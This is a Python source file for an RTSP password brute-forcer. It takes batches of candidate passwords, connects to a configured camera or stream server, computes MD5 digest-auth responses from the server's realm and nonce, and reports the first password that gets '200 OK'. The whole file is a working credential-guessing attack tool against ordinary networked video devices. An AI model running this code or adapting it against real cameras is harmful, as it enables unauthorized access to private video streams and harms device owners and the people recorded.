import base64
import hashlib
import socket

from config import Config

config = Config()


def digest_response(response, password):
    # if '200 OK' in str(response) or password == config.debug_password:
    if '200 OK' in str(response):
        return [True, '200 OK', password]
    elif '401 Unauthorized' in str(response):
        return [False, '401 Unauthorized', password]
    elif '404 Stream Not Found' in str(response):
        return [False, '404 Stream Not Found', password]
    else:
        return False, response


def base64encode(password):
    username = config.rtsp_username
    credentials = f'{username}:{password}'
    credentials_bytes = credentials.encode('ascii')
    base64_bytes = base64.b64encode(credentials_bytes)
    return base64_bytes


def generate_auth_string(username, password, realm, nonce, uri='unicast', method='DESCRIBE'):
    m1 = hashlib.md5(f'{username}:{realm}:{password}'.encode('utf-8')).hexdigest()
    m2 = hashlib.md5(f'{method}:{uri}'.encode('utf-8')).hexdigest()
    response = hashlib.md5(f'{m1}:{nonce}:{m2}'.encode('utf-8')).hexdigest()

    mapRetInf = "Digest "
    mapRetInf += "username=\"" + username + "\", "
    mapRetInf += "realm=\"" + realm + "\", "
    mapRetInf += "algorithm=\"MD5\", "
    mapRetInf += "nonce=\"" + nonce + "\", "
    mapRetInf += "uri=\"" + uri + "\", "
    mapRetInf += "response=\"" + response + "\""
    return mapRetInf


def get_realm_and_nonce(response):
    start = response.find("realm")
    begin = response.find("\"", start)
    end = response.find("\"", begin + 1)
    realm = response[begin + 1:end]

    start = response.find("nonce")
    begin = response.find("\"", start)
    end = response.find("\"", begin + 1)
    nonce = response[begin + 1:end]
    return realm, nonce


def generate_describe_msg(url, seq, user_agent, auth_seq):
    msg_ret = "DESCRIBE " + url + " RTSP/1.0\r\n"
    msg_ret += "CSeq: " + str(seq) + "\r\n"
    msg_ret += "Authorization: " + auth_seq + "\r\n"
    msg_ret += "User-Agent: " + user_agent + "\r\n"
    msg_ret += "Accept: application/sdp\r\n"
    msg_ret += "\r\n"
    return msg_ret


def create_conn(pass_bulk):
    password = ''
    print(f'Start {pass_bulk[0]} - {pass_bulk[-1]}')
    try:
        for password in pass_bulk:
            # b64 = base64encode(password=password)
            dest = f"DESCRIBE rtsp://{config.rtsp_username}:{password}@{config.rtsp_ip}:{config.rtsp_port}/unicast RTSP/1.0\r\nCSeq: 2\r\n\r\n"
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((config.rtsp_ip, config.rtsp_port))
            s.send(dest.encode())
            response = s.recv(4096)
            if b"Unauthorized" in response:
                realm, nonce = get_realm_and_nonce(str(response))
                auth_seq = generate_auth_string(username=config.rtsp_username, password=password, realm=realm,
                                                nonce=nonce)
                url = f"rtsp://{config.rtsp_ip}:{config.rtsp_port}/unicast"

                x = generate_describe_msg(url=url, seq=1, user_agent='RTSP Client', auth_seq=auth_seq)
                s.send(str.encode(x))
                response = s.recv(4096)

            match, msg, password = digest_response(response, password)
            if match:
                print(match, msg, password)
                return [match, msg, password]
            elif "Unauthorized" not in msg:
                return [match, msg, password]

    except socket.error as e:
        print(e)
    except (ConnectionRefusedError, ConnectionResetError) as e:
        print(
            f'{e}: {config.rtsp_ip}:{config.rtsp_port} - {config.rtsp_username}:{password}')
    finally:
        print(f'Done {pass_bulk[0]} - {pass_bulk[-1]}')
